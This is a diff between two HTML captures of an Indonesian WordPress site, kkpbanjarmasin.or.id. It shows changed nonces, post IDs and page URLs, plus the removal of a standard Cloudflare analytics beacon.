+        <path id="htwasqicona-chat" d="M1023.941 765.153c0 5.606-.171 17.766-.508 27.159-.824 22.982-2.646 52.639-5.401 66.151-4.141 20.306-10.392 39.472-18.542 55.425-9.643 18.871-21.943 35.775-36.559 50.364-14.584 14.56-31.472 26.812-50.315 36.416-16.036 8.172-35.322 14.426-55.744 18.549-13.378 2.701-42.812 4.488-65.648 5.3-9.402.336-21.564.505-27.15.505l-504.226-.081c-5.607 0-17.765-.172-27.158-.509-22.983-.824-52.639-2.646-66.152-5.4-20.306-4.142-39.473-10.392-55.425-18.542-18.872-9.644-35.775-21.944-50.364-36.56-14.56-14.584-26.812-31.471-36.415-50.314-8.174-16.037-14.428-35.323-18.551-55.744-2.7-13.378-4.487-42.812-5.3-65.649-.334-9.401-.503-21.563-.503-27.148l.08-504.228c0-5.607.171-17.766.508-27.159.825-22.983 2.646-52.639 5.401-66.1514.141-20.306 10.391-39.473 18.542-55.426C34.154 93.24 46.455 76.336 61.07 61.747c14.584-14.559 31.472-26.812 50.315-36.416 16.037-8.172 35.324-14.426 55.745-18.549 13.377-2.701 42.812-4.488 65.648-5.3 9.402-.335 21.565-.504 27.149-.504l504.227.081c5.608 0 17.766.171 27.159.508 22.983.825 52.638 2.646 66.152 5.401 20.305 4.141 39.472 10.391 55.425 18.542 18.871 9.643 35.774 21.944 50.363 36.559 14.559 14.584 26.812 31.471 36.415 50.315 8.174 16.037 14.428 35.323 18.551 55.744 2.7 13.378 4.486 42.812 5.3 65.649.335 9.402.504 21.564.504 27.15l-.082 504.226z"/>
         </defs>
         <linearGradient id="htwasqiconb-chat" gradientUnits="userSpaceOnUse" x1="512.001" y1=".978" x2="512.001" y2="1025.023">
             <stop offset="0" stop-color="#61fd7d"/>
@@ -826,21 +884,21 @@ wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-recipe/js/jquery.rateyo.min.js?ver=2.3" id="jquery-recipe-rateyo-js"></script>
 <script type="text/javascript" id="penci_rateyo-js-extra">
 /* <![CDATA[ */
-var PENCI = {"ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d0b607a315","normalFill":"#b9b9b9","ratedFill":"#FFCA00"};
+var PENCI = {"ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"b714e37329","normalFill":"#b9b9b9","ratedFill":"#FFCA00"};
 /* ]]> */
 </script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-recipe/js/rating_recipe.js?ver=2.3.2" id="penci_rateyo-js"></script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-review/js/jquery.easypiechart.min.js?ver=1.0" id="jquery-penci-piechart-js"></script>
 <script type="text/javascript" id="penci-rateyo-review-js-extra">
 /* <![CDATA[ */
-var PENCI = {"postID":"4828","ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d0b607a315","normalFill":"#b9b9b9","ratedFill":"#FFCA00"};
+var PENCI = {"postID":"974","ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"b714e37329","normalFill":"#b9b9b9","ratedFill":"#FFCA00"};
 /* ]]> */
 </script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-review/js/rating_review.js?ver=3.0" id="penci-rateyo-review-js"></script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/themes/pennews/js/script.lib.min.js?ver=6.6.1" id="penci-script-lib-js"></script>
 <script type="text/javascript" id="penci-js-extra">
 /* <![CDATA[ */
-var PENCILOCALIZE = {"ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d0b607a315","errorMsg":"Something wrong happened. Please try again.","login":"Email Address","password":"Password","errorPass":"<p class=\"message message-error\">Password does not match the confirm password<\/p>","prevNumber":"1","minlengthSearch":"0","linkTitle":"View More","linkTextAll":"Menu","linkText":"More"};
+var PENCILOCALIZE = {"ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"b714e37329","errorMsg":"Something wrong happened. Please try again.","login":"Email Address","password":"Password","errorPass":"<p class=\"message message-error\">Password does not match the confirm password<\/p>","prevNumber":"1","minlengthSearch":"0","linkTitle":"View More","linkTextAll":"Menu","linkText":"More"};
 /* ]]> */
 </script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/themes/pennews/js/script.min.js?ver=6.6.1" id="penci-js"></script>
@@ -852,7 +910,7 @@ var wpald = {"url":"https:\/\/kkpbanjarmasin.or.id\/wp-json\/wp\/v2\/media","typ
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wp-accessibility/js/longdesc.min.js?ver=2.1.12" id="wpa.longdesc-js"></script>
 <script type="text/javascript" id="wp-accessibility-js-extra">
 /* <![CDATA[ */
-var wpa = {"skiplinks":{"enabled":false,"output":""},"target":"1","tabindex":"1","underline":{"enabled":false,"target":"a"},"dir":"ltr","lang":"en-US","titles":"1","labels":"1","wpalabels":{"s":"Search","author":"Name","email":"Email","url":"Website","comment":"Comment"},"current":"","errors":"","tracking":"1","ajaxurl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","security":"4a1d679818","action":"wpa_stats_action","url":"https:\/\/kkpbanjarmasin.or.id\/tugas-fungsi-ppid\/","post_id":"4828"};
+var wpa = {"skiplinks":{"enabled":false,"output":""},"target":"1","tabindex":"1","underline":{"enabled":false,"target":"a"},"dir":"ltr","lang":"en-US","titles":"1","labels":"1","wpalabels":{"s":"Search","author":"Name","email":"Email","url":"Website","comment":"Comment"},"current":"","errors":"","tracking":"1","ajaxurl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","security":"1412775d12","action":"wpa_stats_action","url":"https:\/\/kkpbanjarmasin.or.id\/dokumen\/","post_id":"974"};
 /* ]]> */
 </script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wp-accessibility/js/wp-accessibility.min.js?ver=2.1.12" id="wp-accessibility-js"></script>
@@ -896,6 +954,5 @@ var wpData = {"baseUrl":"https:\/\/kkpbanjarmasin.or.id"};
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/ml-slider/assets/metaslider/script.min.js?ver=3.92.1" id="metaslider-script-js"></script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/ml-slider/assets/easing/jQuery.easing.min.js?ver=3.92.1" id="metaslider-easing-js"></script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/horizontal-scrolling-announcements/script/jquery.marquee.min.js?ver=6.6.4" id="jquery.marquee.min-js"></script>
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"02cc1a4c4bfc45ffbc53912b71552494","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
